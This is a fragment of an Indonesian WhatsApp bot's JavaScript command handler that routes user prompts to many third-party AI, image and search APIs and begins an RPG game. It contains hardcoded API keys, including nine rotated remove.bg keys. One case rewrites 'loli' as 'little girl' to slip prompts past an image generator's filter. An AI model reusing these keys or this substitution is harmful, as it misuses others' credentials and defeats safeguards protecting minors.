if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await fetchJson(`https://nekohime.xyz/api/ai/gemini?text=${text}&apikey=${ApiNeko}`)
RezzHost.sendMessage(m.chat, {
text: d.result,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | ${botname}`,
body: '',
thumbnailUrl: `https://telegra.ph/file/1462316a58db5f329c437.jpg`,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'llama': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await fetchJson(`https://api.safone.dev/llama?query=${text}`)
reply2(d.answer)
}
break
case 'palm-ai': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await fetchJson(`https://itzpire.site/ai/palm-ai?q=${text}`)
reply2(d.result)
}
break
case 'lumin-ai': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await chApi.luminai(text)
RezzHost.sendMessage(m.chat, {
text: d,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | L U M I N A I`,
body: '',
thumbnailUrl: "https://telegra.ph/file/2a804f8d22a4926c3dfca.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'claude-ai': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await fetchJson(`https://api.maelyn.my.id/api/claude?q=${text}&apikey=${maelyn}`)
RezzHost.sendMessage(m.chat, {
text: `${gris}${d.result}${gris}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `C L A U D E - A I`,
body: '',
thumbnailUrl: "https://telegra.ph/file/673d2cc5583c2b659b282.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'phi3-ai': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
let d = await fetchJson(`https://itzpire.site/ai/phi3_mini?q=${text}`)
reply(d.result)
}
break
case 'mixtral-ai': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await fetchJson(`https://itzpire.site/ai/multi-ai-chat?model=mixtral&q=${text}`)
reply(d.data.response.message)
}
break
case 'mistral-ai': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await fetchJson(`https://itzpire.site/ai/mistral?q=${text}`)
reply(d.data)
}
break
case 'sooks-ai': {
if (!text) return reply('masukan teks')
await loading()
let d = await fetchJson(`https://itzpire.site/ai/sooksAI?text=${text}`)
reply2(d.data.result)
}
break
case 'chatbot': {
if (!text) return reply(`apa yang ingin kamu tanyakan??`)
let ca = await ChatBotz(text)
reply(ca.modelResponse)
}
break
case 'ask': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await fetchJson(`https://ai.system.siputzx.my.id/api/gemini-ask?q=${text}`)
reply2(d.text)
}
break
case 'smartcontract': {
if (!text) return reply(`${command} Apa itu Coding`)
            reply(mess.search)
            let yanz = await fetchJson(`https://api-pi-henna.vercel.app/api/smartcontract?message=${text}`)
            reply(yanz.data.response)
            }
break
case 'ragbot-ai': {
if (!text) return reply(`${command} Apa itu Coding`)
            reply(mess.search)
            let yanz = await fetchJson(`https://api.xyro.fund/api/ragbot?message=${text}`)
            reply(yanz.data.response)
            }
break
case "degreeguru":
        if (!text) return reply("Mau Nanya apa Ke dengreeguru")
 let isu = await fetchJson(`https://api.hyuunewbie.my.id/api/degreeguru?message=${text}`)
let rereee = isu
reply(`${command}\n${rereee}`)
        break
case 'aiv2': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
reply(mess.search)
let d = await fetchJson(`https://itzpire.site/ai/gpt?model=gpt-4&q=${text}`)                
await RezzHost.sendMessage(m.chat, {
text: d.data.response,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `O P E N A I - V 2`,
body: '',
thumbnailUrl: `https://tinyurl.com/ykadv8uh`,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
            }
            break
case 'gptweb': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
reply(mess.search)
let d = await fetchJson(`https://itzpire.site/ai/gpt-web?q=${text}`)     
m.reply(`*[ G P T - W E B ]*\n\n${gris}${d.result}${gris}`)
}
break
case 'google-ai': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
let d = await fetchJson(`https://acez.vercel.app/api/others/blackbox?q=${text}`)                
await RezzHost.sendMessage(m.chat, {
text: d.data,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `G O O G L E - A I`,
body: '',
thumbnailUrl: `https://telegra.ph/file/357c9ecd11207ef9ee150.jpg`,
sourceUrl: `https://ai.google/`,
mediaType: 1,
renderLargerThumbnail: true
}}
})
            }
            break
case 'lirik': {
if (!text) return reply(`Example: ${prefix + command} Melukis Senja`)
var data = await chApi.lirik(text)
p = `*Lirik: ${text}*\n\n`
p += `${data.lirik}\n\n\n`
p += `${footer}`
RezzHost.sendMessage(m.chat, {
text: p,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `L I R Y C S`,
body: '',
thumbnailUrl: data.thumb,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'lyrics': {
if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
let dat = await fetchJson(`https://aemt.me/lirik?text=${text}`)
let t = `*Title* : ${dat.result.title}\n*Artist* : ${dat.result.artist}\n\n*Lirik*:\n${dat.result.lyrics}`
RezzHost.sendMessage(m.chat, {
text: t,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `L I R Y C S`,
body: '',
thumbnailUrl: dat.result.image,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'bardimg': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Example :\n(Reply Img) *.${command}* how to fix`)
reply(mess.getdata)
let media = await quoted.download()
let out = await uploadImage(media)
let kay = await questionWithImage({ask: `${text}`,image: `${out}`})
reply2(kay.content)
}
break
case 'bard2': {
if (!text) return reply(`reply image nya bang`)
reply(mess.getdata)
let kay = await question({ask: `${text}`})
reply(kay.content)
}
break
case 'chatgptimg': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Example :\n(Reply Img) *.${command}* how to fix`)
reply(mess.getdata)
let media = await quoted.download()
let urlny = await uploadImage(media)
let kay = await fetchJson(`https://api.yanzbotz.my.id/api/ai/chatgpt-image?url=${urlny}&query=${text}&apiKey=${yanzApi}`)
reply2(kay.result)
}
break
case 'blackboximg': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Example :\n(Reply Img) *.${command}* how to fix`)
reply(mess.getdata)
let media = await quoted.download()
let urlny = await uploadImage(media)
let kay = await fetchJson(`https://api.yanzbotz.my.id/api/ai/blackbox-image?url=${urlny}&query=${text}&apiKey=${yanzApi}`)
reply2(kay.result)
}
break
case 'blackbox': {
if (!text) return reply(`Contoh : ${command} Apa itu Coding`)
            reply(mess.search)
            let yanz = await fetchJson(`https://api.kiicodeit.me/ai/blackbox?text=${text}&apikey=${kicode}`)
            reply(yanz.result)
            } 
break            
case 'ai': case 'openai': {
if (!text) return reply(`*Contoh :* ${command} Apa itu Coding`)
            reply(mess.search)
            let yanz = await fetchJson(`https://aemt.me/v2/gpt4?text=${text}`)
RezzHost.sendMessage(m.chat, {
text: `${tTeks2}${yanz.result}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `O P E N - A I`,
body: '',
thumbnailUrl: "https://telegra.ph/file/f47d75d0d4827356a526d.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
            }
break
case 'leolm-ai': {
if (!text) return reply(`${command} Apa itu Coding`)
reply(mess.search)
let yanz = await fetchJson(`https://api.miftahganzz.my.id/api/ai/leolm?stream=true&q=${text}&apikey=${miftah}`)
reply(yanz.data.result)
}
break
case 'sindy-ai':{
if (!text) return reply(`*• Example:* ${usedPrefix + command} halo`)
await loading()
try {
let gpt = await fetchJson(`https://itzpire.site/ai/botika?q=${text}&user=${m.sender}&model=sindy`)
reply("*[ SINDY - AI ]* " + '\n' + gpt.result)
 } catch(e) {
 return reply2("`*Gpt Not Responded*`")
}
}
break
case 'c.ai': {
if (!text) return reply(`Cara penggunaan:\n${prefix + command} [char]|[quest]\n\nContoh:\n${prefix + command} Raiden Shogun|Halo, apa kabar?`)
let [char, quest] = text.split("|")
if (!char) return reply(`Masukkan nama karakter`)
if (!quest) return reply(`Masukkan quest`)
let anu = await fetchJson(`https://api.caliph.biz.id/api/ai/c-ai?q=${quest}&char=${char}&apikey=${caliph}`)
reply(mess.search)
reply(`${anu.result.character}\n${anu.result.response}`)
}
break
case 'b.ai': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Cara penggunaan:\n${command} query`)
let anu = await fetchJson(`https://api.caliph.biz.id/api/ai/blackbox?q=${q}&apikey=${caliph}`)
reply(mess.search)
await reply(`${anu.result}`)
}
break
case 'aimage':
await loading()
try {
if (global.keyopenai === '') return reply("Apikey limit exceeded");
if (!q) return reply(`Generate image from AI.\n\nExample:\n${prefix + command} man riding horse`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
RezzHost.sendImage(from, response.data.data[0].url, text, kalgans);
} catch (err) {
console.log(err);
reply("Sorry, there seems to be an error :"+ err);
}
break
case 'removebg2': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}*`)
reply(mess.getdata)
let media = await quoted.download()
let urlny = await uploadImage(media)
RezzHost.sendImage(m.chat, `https://api.yanzbotz.my.id/api/tools/removebg?url=${urlny}`, mess.success, kalgans)
}
break
case 'removebg':{
	    if (!quoted) return reply `Kirim/Reply Image Dengan Caption ${command}`
	    if (!/image/.test(mime)) return reply `Kirim/Reply Image Dengan Caption ${command}`
	    if (/webp/.test(mime)) return reply `Kirim/Reply Image Dengan Caption ${command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await RezzHost.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    RezzHost.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success }, { quoted : kalgans })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
break
case '2img2': {
if (!text) throw 'Masukkan Query!'
reply(mess.wait)
RezzHost.sendMessage(m.chat, { image: { url: `https://aemt.me/v2/text2img?text=${text}` }, caption:`Sukses Tuan✅` }, { quoted: kalgans })
}
break
case '2img': {
if (!text) throw 'Masukkan Prompt!'
reply(mess.getdata)
RezzHost.sendMessage(m.chat, { image: { url: `https://aemt.me/v1/text2img?text=${text}` }, caption: `Sukses Tuan` }, { quoted: kalgans })
}
break
case 'tinyurl':{
   if(!q) return reply('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  reply(body)
  } catch (e) {
  reply2(e)
  }
  })
  }
 break 
case 'recipe':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example ${prefix+command} samosa`)
reply(mess.search)
let ker = await scp2.cariresep(q)
let teks = `乂 *R E S E P - S E A R C H*\n\n`
ker.data.map((v, i) => {
teks += `${i+1}. ${v.judul}\n`
teks += `*Title* : ${v.judul}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks)
}
break
case 'readrecipe':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example ${prefix+command} https://resepkoki.id/resep/resep-ayam-geprek-keju/`)
reply(mess.wait)
let rain = await scp2.bacaresep(text)
let dty = `Recipe Below
Title : ${rain.judul_nya}
Time : ${rain.waktu_nya}
Result : ${rain.hasil_nya}
Degree of difficulty : ${rain.tingkat_kesulitan}
Material :
${rain.bahan_nya}`
RezzHost.sendMessage(m.chat, { image: { url: rain.thumb_nya }, caption:dty }, {quoted:kalgans})
}
break
case 'gimage': {
 if (!text) throw `Example : ${prefix + command} indo`
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
RezzHost.sendMessage(from, {image: { url: images },
caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`},{quoted:kalgans})
})
}
break
case 'google': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example : ${prefix + command} ${botname}`)
reply(mess.search)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `*[ Google Search From : ${text} ]*\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
}
reply(teks)
})
}
break
case 'duckduckgo': {
if (!q) return reply(`Example : ${prefix + command} ${botname}`)
let duck = require('./lib/scrape/duckduckgo')
let duckgo = await duck.search(text)
let res = duckgo.results
let teks = `${gris}[ D U C K D U C K G O - S E A R C H ]${gris}\n\n`
for (let g of res) {
teks += `${hiasan}*Title* : ${g.title}\n`
teks += `${hiasan}*Description* : ${g.description}\n`
teks += `${hiasan}*Hostname* : ${g.hostname}\n`
teks += `${hiasan}*Url* : ${g.url}\n\n────────────────────────\n\n`
}
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: global.tag,
body: '',
thumbnailUrl: "https://telegra.ph/file/9f4b271f67174d33b1948.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'remini2': {
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply('berikan scalanya!!!') 
await loading()
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let anu = await uptotelegra(media)
const response = await fetchJson(`https://api.betabotz.eu.org/api/tools/remini-v3?url=${anu}&resolusi=${q}&apikey=${btbApi}`);
const imageData = response.url;
await RezzHost.sendMessage(m.chat, { image: { url: imageData }, caption: mess.done }, { quoted: kalgans });
}
break
case 'remini': {
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)	
			let media = await quoted.download()
			let proses = await remini2(media, "enhance")
			RezzHost.sendImage(from, proses, mess.success, kalgans)
			}
			break
case 'hd': {
if (!isMedia) return reply("Mana Foto Nya?")
reply(mess.wait)
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let anu = await uptotelegra(media)
RezzHost.sendMessage(m.chat, {
image: {
url: `https://api.lolhuman.xyz/api/upscale?apikey=${apikey}&img=${anu}`
},
caption: 'done'
}, {
quoted: kalgans
})
}
break
case 'enhance': {
if (!quoted) return reply("reply image nya")
if (!/image/.test(mime)) return reply(`khusus image bang`)
reply(mess.wait)
let media = await quoted.download()
let anu = await uploadImage(media)
let rsult = await fetchJson(`https://itzpire.site/tools/enhance?url=${anu}&type=modelx4`)
RezzHost.sendMessage(m.chat, { image: { url: rsult.result.img }, caption: 'done' }, { quoted: kalgans })
}
break
case 'upscale': {
if (!quoted) return reply("reply image nya")
if (!/image/.test(mime)) return reply(`khusus image bang`)
reply(mess.wait)
let media = await quoted.download()
let anu = await uploadImage(media)
let rsult = await fetchJson(`https://itzpire.site/tools/upscale?url=${anu}`)
RezzHost.sendMessage(m.chat, { image: { url: rsult.result }, caption: 'done' }, { quoted: kalgans })
}
break
case 'hdvid': {
if (!quoted) return reply("reply Video nya")
if (!/video/.test(mime)) return reply(`khusus Video bang`)
reply(mess.wait)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
let rsult = await fetchJson(`https://api.alyachan.dev/api/vid-enhance?video=${anu}&apikey=${alya}`)
RezzHost.sendMessage(m.chat, { video: { url: rsult.data.url }, caption: 'done' }, { quoted: kalgans })
}
break
case 'hdv2': {
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply('berikan scalanya!!!') 
reply(mess.wait)
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let anu = await uptotelegra(media)
async function getHd() {
try {
const response = await axios.get(`https://api.caliph.biz.id/api/upscale/v2?img=${anu}&scale=${q}&apikey=${caliph}`);
if (response.status === 200) {
const imageData = response.data;
if (imageData.data) {
const image_url = imageData.data.img;
await RezzHost.sendMessage(m.chat, { image: { url: image_url }}, { quoted: kalgans });
} else {
reply('terjadi kesalaham');
}
} else {
reply(`Gagal Mengambil Data`);
}
} catch (error) {
reply(`Terjadi kesalahan: ${error.message}`);
}
}
getHd();
}
break
case 'toalien':{
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
reply(mess.getdata)
const media2 = await quoted.download()
const anu = await uploadImage(media2)
RezzHost.sendImage(m.chat, `https://api.neoxr.my.id/api/effect?style=alien&image=${anu}&apikey=${ApiNx}`, `🍁 Ini Hasilnya Kak...`, kalgans)
}
break
case 'tozombie': {
if (!/image/.test(mime)) return reply("Where The A Image")
reply(mess.search)
let media = await quoted.download()
let anu = await uploadImage(media)
let dat = await fetchJson(`https://itzpire.site/tools/jadizombie?url=${anu}`)
await RezzHost.sendMessage(m.chat, { image: { url: dat.result }, caption: mess.done }, { quoted: kalgans })
}
break
case 'toanime3d': {
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await loading()
let old = new Date()
const media2 = await quoted.download()
const anu = await uploadImage(media2)
let an = await fetchJson(`https://api.betabotz.eu.org/api/maker/jadianime3d?url=${anu}&apikey=${btbApi}`) 
RezzHost.sendMessage(m.chat, { image: { url: an.result.output.fileUrl }, caption: mess.done }, { quoted: kalgans })
}
break
case 'toanime': {
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await loading()
let old = new Date()
const media2 = await quoted.download()
const anu = await uploadImage(media2)
RezzHost.sendMessage(m.chat, { image: { url: `https://api.kiicodeit.me/ai/toanime?url=${anu}&apikey=${kicode}` }, caption: mess.done }, { quoted: kalgans })
}
break
case 'toanime2': {
if (!quoted) return reply2(`🚩 Reply photo.`)
if (!/image\/(jpe?g|png|webp)/.test(mime)) return reply2(`🚩 Only for photo.`)
await loading()
let img = await quoted.download()
let json = await scrap.uploadImageV3(img)
let jsonq = await chApi.toanime(json.data.url)
RezzHost.sendImage(m.chat, jsonq.url.img_crop_single, 'Done Kak', kalgans)
}
break
case 'jadigta': {
if (!quoted) return reply2(`🚩 Reply photo.`)
if (!/image\/(jpe?g|png|webp)/.test(mime)) return reply2(`🚩 Only for photo.`)
await loading()
let img = await quoted.download()
let json = await scrap.uploadImageV3(img)
let jsonq = await fetchJson(`https://api.betabotz.eu.org/api/maker/jadigta?url=${json}&apikey=${btbApi}`)
RezzHost.sendImage(m.chat, jsonq.result, 'Done Kak', kalgans)
}
break
case 'whisper': {
if (!/audio/.test(mime)) return reply2(`🚩 Only for audio.`)
if (!quoted) return reply2(`🚩 Reply Audio.`)
await loading()
let { UploadFileUgu } = require('./lib/uploader2')
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let pu = await UploadFileUgu(media)
let jsonq = await fetchJson(`https://itzpire.site/tools/whisper?url=${pu.url}`)
reply2(jsonq.data.text)
}
break
case 'gambar': {
if (!text) return reply(`Example: ${prefix + command} panda`)
await loading()
let timestamp = speed()
let latensi = speed() - timestamp
let an = await fetchJson(`https://vihangayt.me/tools/aiimg?q=${text}`)
for (let i = 0; i < 5; i++) {
let inirwsult = an.data.aiImageData[Math.floor(Math.random() * an.data.aiImageData.length)]   
RezzHost.sendMessage(m.chat, { image: { url: inirwsult.images[0].url }, caption: `${inirwsult.name}\n🍟 *Fetching* : ${latensi.toFixed(4)} ms\n\n${footer}`}, { quoted: kalgans })
await sleep(1500)
}
}
break
case 'gptpicture2':{
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} rusa`)
await loading()
let anu = await fetchJson(`https://itzpire.site/ai/gpt-pict?q=${text}`)
for (let i = 0; i < 3; i++) {
var rand = Math.floor(anu.result.length * Math.random())
RezzHost.sendMessage(m.chat, { image: { url: anu.result[rand] }, caption: mess.done }, { quoted: kalgans })
await sleep(2000)
}
}
break
case 'gptpicture':{
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} rusa`)
await loading()
let anu = await gptPictures(text)
for (let i = 0; i < 3; i++) {
var rand = Math.floor(anu.imgs.length * Math.random())
RezzHost.sendMessage(m.chat, { image: { url: anu.imgs[rand] }, caption: mess.done }, { quoted: kalgans })
await sleep(2000)
}
}
break
case 'bingimg-2d': {
if (!text) return reply("[ ! ] masukan prompt gambar yang mau di bikin");
let teksu = text.replace(/loli/gi, "anak gadis kecil");
await loading()
try {
const { BingApi, apikeybing } = require('./lib/scrape/bing-image.js');
const bingApi = new BingApi(apikeybing);
const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
RezzHost.sendMessage(m.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted: kalgans });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await reply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await reply('No images found after filtering.');
}
} catch (error) {
await reply('An error occurred while processing the request.');
}
};
break
case 'bingimg2': {
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} prompt`)
await loading()
let anu = await skyu.bingImage(text)
for (let i = 0; i < 3; i++) {
var rand = Math.floor(anu.results.length * Math.random())
RezzHost.sendMessage(m.chat, { image: { url: anu.results[rand].direct }, caption: mess.done }, { quoted: kalgans })
await sleep(2000)
}
}
break
case 'bingimg': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
if (!text) return reply('Masukan Gambarannya\nContoh:\nAnime cowok memakai baju hitam sedang coading bertuliskan Rerez Hosting')
m.reply('*Proses ini membutuhkan waktu beberapa saat silahkan tunggu*')
try {
let img = await fetchJson(`http://15.235.142.199/api/ai/bingAi?prompt=${text}&apikey=DdUFIJY3sIGZW0g`)
let imgs = img.image
let c = 0
for (let ims of img.image) {
if (c == 0) await RezzHost.sendMessage(m.chat, { image: { url: ims }, caption: `*[ V1 ]* Bing Photo ☑\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}` }, { quoted: m })
else await RezzHost.sendMessage(m.sender, { image: { url: ims }}, { quoted: m })
c += 1
await sleep(2000)
}
} catch {
m.reply('Terjadi kesalahan!')
}
}
break
case 'bingimage': case 'bingimg3': {
if (!text) return reply(`Example: ${prefix + command} panda`)
         reply(mess.search)
         let timestamp = speed()
let latensi = speed() - timestamp
         let anm = await bingimage(text)
         for (let i = 0; i < 3; i++) {
      	 let an = anm.results[Math.floor(Math.random() * anm.results.length)]   
         RezzHost.sendMessage(m.chat, { image: { url: an.direct }, caption: `*Query* : ${text}\n*Source* : ${an.source}\n\n🍟 *Fetching* : ${latensi.toFixed(4)} ms\n\n${footer}`}, { quoted: kalgans })
         await sleep(1500)
         }
      }
      break
case 'bingsearch': {
if (!text) return reply(`Example: ${prefix + command} Kayy`)
reply(mess.search)
let anu = await bingsearch(text)
anu = anu.results
let txt = `Found : ${text}`
for (var x of anu) {
txt += `\n\n*${x.title}*\n`
txt += `${x.url}\n`
txt += `_${x.description}_\n`
txt += `───────────────────`
}
await reply(txt)
}
break
// BATAS AI MENU

// RPG MENU

case 'me': {
let caption = `乂  *U S E R - P R O F I L E*\n\n`
caption += `	◦ *Name* : ${users.name}\n`
caption += `	◦ *Banned* : ${users.banned}\n`
caption += `	◦ *Balance* : ${users.balance}\n`
caption += `	◦ *Limit* : ${users.limit}\n`
caption += `	◦ *LastClaim* : ${msToDate(users.lastclaim)}\n`
caption += `	◦ *Exp* : ${users.exp}\n`
caption += `	◦ *Premium* : ${users.premium}\n`
caption += `	◦ *Verified* : ${users.registered}\n`
caption += `	◦ *Hitstat* : ${users.hit}\n`
caption += `	◦ *Expired* : ${users.expired == 0 ? '-' : msToDate(users.expired - new Date() * 1)}\n\n`
caption += global.footer
RezzHost.sendMessage(m.chat, {
text: caption,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | ${botname}`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break

case 'joinrpg':{
if (!m.isGroup) return m.reply("Khusus Group")
if (isPetualang) return m.reply('Kamu Telah join sebelumnya')
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
_petualang.push(m.sender)
addInventoriDarah(m.sender, DarahAwal)
addInventori(m.sender)
addInventoriBuruan(m.sender)
fs.writeFileSync('./src/rpg/inventory.json', JSON.stringify(_petualang))
addLevelingId(m.sender) 
let itu = 'https://telegra.ph/file/a4ec01498e764ae42c8c4.jpg'
RezzHost.sendMessage(m.chat, {image:{url: itu}, caption: 'Sukses join Rpg games' }, {quoted:m})
}
break
case 'mancing':{
if (!m.isGroup) return m.reply('[ System Notice ] Only for group')
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
setTimeout( () => {
const fishing = Math.ceil(Math.random() * 10)
addIkan(m.sender, fishing)
 m.reply(`*FISH FISHED* kamu mendapatkan *${fishing}* Ikan selama 1 menit`)
}, 60000); //2 minute
setTimeout( () => {
 m.reply('Ikannya Terpancing!..' )
}, 20000) // 1000 = 1s,
setTimeout( () => {
 m.reply('🎣 Menarik Kail. . .' )
}, 7000) // 1000 = 1s,
setTimeout( () => {
let mancingnya = 'https://telegra.ph/file/4cc0b6bd2827a9b23a189.mp4'
RezzHost.sendMessage(from, {video: {url:mancingnya}, caption: 'mulai memancing', gifPlayback: true},{quoted:m})
}, 0) // 1000 = 1s,
}
break
case 'inv': case 'me': case 'inventori': case 'inventory': case 'profile':{
if(!isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
let teksehmazeh = `*INFO USER*\n\n
 *📝 Name* : ${pushname}\n
 *📱 Number* : ${nomore}\n
 *🎟️ Limit* : ${users.limit}\n
 *👩‍⚕️ Premium* : ${isPrem ? 'Premium':'Free'}\n
 *🕺🏻 Petualang* : ${isPetualang ? 'Petualang':'Bukan Petualang'}\n\n
 *RPG USER*\n\n
 *❤️ Blood* : ${getDarah(m.sender) ? getDarah(m.sender) : 0}\n
 *◻️️ Iron* : ${getBesi(m.sender) ? getBesi(m.sender) : 0}\n
 *🌟 Gold* : ${getEmas(m.sender) ? getEmas(m.sender) : 0}\n
 *🐲 Emerald* : ${getEmerald(m.sender) ? getEmerald(m.sender) : 0}\n
 *💎 Diamond* : ${getDm(m.sender) ? getDm(m.sender) : 0}\n
 *💰 Money* : $${users.balance}\n
 *💵 Saldo* : Rp. ${toRupiah(users.balance)}\n
 *🧪 Potion* : ${getPotion(m.sender) ? getPotion(m.sender) : 0}\n\n
 *HUNT RESULT*\n
 *🐟 Fish* : ${getIkan(m.sender)}\n
 *🐔 Chicken* : ${getAyam(m.sender) ? getAyam(m.sender) : 0}\n
 *🐇 Rabbit* : ${getKelinci(m.sender) ? getKelinci(m.sender) : 0}\n
 *🐑 Sheep* : ${getDomba(m.sender) ? getDomba(m.sender) : 0}\n
 *🐄 Cow* : ${getSapi(m.sender) ? getSapi(m.sender) : 0}\n
 *🐘 Elephant* : ${getGajah(m.sender) ? getGajah(m.sender) : 0}\n
 🎢 *Coal* : ${getMiningcoal(m.sender) ? getMiningcoal(m.sender) : 0}\n
 🛑 *Stone* : ${getMiningstone(m.sender) ? getMiningstone(m.sender) : 0}\n
 ❄️ *Copper Ore* : ${getMiningore(m.sender) ? getMiningore(m.sender) : 0}\n
